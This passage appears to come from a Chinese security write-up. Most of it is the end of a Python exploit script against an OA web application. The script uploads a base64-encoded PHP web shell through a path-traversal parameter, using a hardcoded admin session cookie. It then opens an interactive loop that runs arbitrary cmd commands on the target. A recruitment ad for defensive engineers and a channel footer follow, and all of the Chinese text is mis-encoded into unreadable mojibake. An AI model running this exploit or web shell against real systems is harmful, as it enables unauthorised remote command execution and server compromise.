        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie":  Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwCmVjaG8gIlBlaVFpX1dpa2kiOwokY29tbWFuZD0kX0dFVFsncGVpcWknXTsKJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiRzdGRvdXQgPSAkZXhlYy0+U3RkT3V0KCk7CiRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7CmVjaG8gJHN0cm91dHB1dDsKPz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \033[0m".format(target_url))
        if "æ¡£æ¡ˆå·²ä¿å­˜" in response.text and response.status_code == 200:
            print("\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼  peiqi.log æ–‡ä»¶, \033[0m".format(target_url))
            POC_3(target_url, Cookie)
        else:
            print("\033[31m[x] ç›®æ ‡ {} ä¸Šä¼  peiqi.log æ–‡ä»¶å¤±è´¥\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)

def POC_3(target_url, Cookie):
    vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=dir"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":  Cookie,
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \033[0m".format(target_url))
        if "PeiQi_Wiki" in response.text and response.status_code == 200:
            print("\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­åŒ…å« PeiQi_Wiki,å­˜åœ¨æ¼æ´,æ‰§è¡Œdir \033[0m".format(target_url))
            print("\033[32m[o] å“åº”ä¸º:{} \033[0m".format(response.text))
            while True:
                cmd = str(input("\033[36mCmd >>> \033[0m"))
                POC_4(target_url, Cookie, cmd)
        else:
            print("\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­ä¸åŒ…å« PeiQi_Wiki\033[0m".format(target_url))
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)

def POC_4(target_url, Cookie, cmd):
    vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi={}".format(cmd)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":  Cookie,
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] å“åº”ä¸º:{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    Cookie = "USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31"
    POC_1(target_url, Cookie)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXib5PtafyGPEicesKbMSsolqCKHemWAfWhC4zTaoft0ajGJQ72SENSJgbg/640?wx_fmt=png)

é¡ºä¾¿æ‹›ä¸‹ HW äººå‘˜å•¦~  

ç›´æ‹› HW é©»åœºå·¥ç¨‹å¸ˆï¼ˆé˜²å®ˆæ–¹ï¼‰  
å²—ä½åç§°ï¼šHW é©»åœºå·¥ç¨‹å¸ˆ  
å²—ä½å±æ€§ï¼š4 æœˆä»½å¼€å§‹ï¼ŒçŸ­æœŸï¼ˆä¸ºæœŸ 14-21 å¤©ï¼‰  
å·¥ä½œåœ°ç‚¹ï¼šå…¨å›½ï¼ŒåŒ—ä¸Šå¹¿æ·±ä¸ºä¸»  
å²—ä½èŒè´£ï¼šè´Ÿè´£æŠ¤ç½‘æœŸé—´å®‰å…¨è®¾å¤‡çš„ç›‘æ§å€¼å®ˆå·¥ä½œï¼Œå¯¹å‘ç°çš„æ”»å‡»è¡Œä¸ºè¿›è¡ŒåŠæ—¶ä¸ŠæŠ¥ï¼Œå¯¹å…¥ä¾µæˆåŠŸçš„äº‹ä»¶è¿›è¡Œåº”æ€¥å“åº”ã€åˆ†æå¤„ç½®ã€è¿½è¸ªæº¯æºã€‚  
å²—ä½è¦æ±‚ï¼š  
1. æ¥å— 7*24 å°æ—¶æ’ç­è¦æ±‚ï¼›  
2. ç†Ÿæ‚‰ Web æ”»é˜²ï¼Œå¯¹ç½‘ç»œæµé‡æ—¥å¿—åˆ†ææœ‰ä¸€å®šç»éªŒï¼›  
3. æœ‰è¿‡æŠ¤ç½‘ / æ”»é˜²æ¼”ç»ƒé˜²å®ˆç»éªŒä¼˜å…ˆï¼›  
4. æœ‰å®é™…å·¥ä½œç»éªŒ 1 å¹´åŠä»¥ä¸Šï¼Œæœ‰ HW ç»éªŒä¼˜å…ˆï¼›  
5. å…·å¤‡åº”æ€¥å“åº”ã€æº¯æºåˆ†æèƒ½åŠ›ã€ååˆ¶èƒ½åŠ›Â ä¼˜å…ˆï¼›  
è–ªèµ„å¾…é‡ï¼š2K-5K / å¤©ï¼ŒåŒ…å·®æ—…è´¹ï¼ŒæŠ€æœ¯å¥½ï¼Œå¤§ç‰›ä¸Šä¸å°é¡¶ï¼ˆåŸºäºé¢è¯•ç»“æœï¼‰  
å·¥èµ„ä¸æ‹–æ¬ ï¼Œé¢è¯•é€šè¿‡å³å¯è°ˆå·¥èµ„ã€è°ˆåœ°ç‚¹ã€ç­¾åˆåŒå®šä¸‹æ¥ã€‚

  
æ‹›è˜çš„äºŒç»´ç æ”¾åœ¨ä¸‹é¢å•¦ï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…æ‰«ç å°±å¥½å•¦

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibREWH010p1mj6gn55F4ZpxMGVaFh7GricmWPchhZGTAJiaXYajUa3dYOw/640?wx_fmt=png)

æœ€å
--

> ä¸‹é¢å°±æ˜¯æ–‡åº“çš„å…¬ä¼—å·å•¦ï¼Œæ›´æ–°çš„æ–‡ç« éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨å…¬ä¼—å·
> 
> åˆ«å¿˜äº† Github ä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro75IHato7k7WJakCwObVtic8kOiagRSTylHIhHxg4DVKOhBFDazKkCMgvw/640?wx_fmt=png)